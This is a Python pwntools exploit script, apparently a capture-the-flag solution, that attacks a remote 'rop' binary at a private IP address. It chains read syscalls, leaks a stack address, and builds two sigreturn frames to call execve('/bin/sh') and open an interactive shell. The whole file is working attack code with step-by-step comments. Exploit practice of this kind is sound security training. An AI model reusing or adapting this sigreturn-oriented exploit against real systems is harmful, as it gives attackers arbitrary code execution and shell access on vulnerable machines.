from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
#io = process('./rop')
io = remote("10.30.0.131",12341)

syscall_ret = 0x00000000004004e7
start_addr = 0x00000000004004da

#read(1)--read(2)---read(3)
#read(1)-->write(2)---read(3)
#write(2)--->leak stack address
#read(3)--->read(4);read sigframe;make stack=esp
#readsigframe--->read(5);
#read(5)--->exec sigframe;stack(binsh)==esp+120
#exec sigframe(bin sh)


#gdb.attach(io)
#pause()

payload = p64(start_addr) * 3       #send 3 SYS_read
io.send(payload)
io.send(b'\xdc')                    #one: step over xor eax,eax         two:make rax=1
pause()
stack_addr = u64(io.recv()[8:16])   #leak stack address,wo don't need to know exactly stack address
print("stack addr:",stack_addr)

sigframe = SigreturnFrame()         #start make signal frame
print("sigframe;",type(sigframe))
sigframe.rax = constants.SYS_read   #SYS_read = 0
sigframe.rdi = 0                    #read(0,buf,0x400) means stdin
sigframe.rsi = stack_addr           #buf
sigframe.rdx = 0x400                #0x400
sigframe.rsp = stack_addr           #
sigframe.rip = syscall_ret          #signalreturn address,wo need to control rip to exec SYS_read
input()
payload = p64(start_addr) + b'a' * 8 + bytes(sigframe)  #next time ret address(SYS_read),deadbeef,and signal frame

input()
io.send(payload)


psigreturn = p64(syscall_ret) + b'b' * 7                #syscall_ret gadget,to exec system func(SYS_sigreturn),pointer to SYS_sigreturn(rax=0xf)
input()

io.send(psigreturn)                 
input()

sigframe_t = SigreturnFrame()       #the second time signal frame
sigframe_t.rax = constants.SYS_execve   #to execve 59
sigframe_t.rdi = stack_addr + 0x120     #/bin/sh  address
sigframe_t.rsi = 0x0                    #none
sigframe_t.rdx = 0x0                    #none
sigframe_t.rsp = stack_addr             #
sigframe_t.rip = syscall_ret            #syscall_ret gadget 
frame_payload = p64(start_addr) + b"b"*8 + bytes(sigframe_t)    #last time to make signal frame
print("frame_len:",len(frame_payload))
payload = frame_payload + (0x120 - len(frame_payload)) * b"\x00" + b"/bin/sh\x00"   #to make frame
input()
io.send(payload)                        
input()
io.send(psigreturn)                     #to execve signalreuturn 
input()

io.interactive()
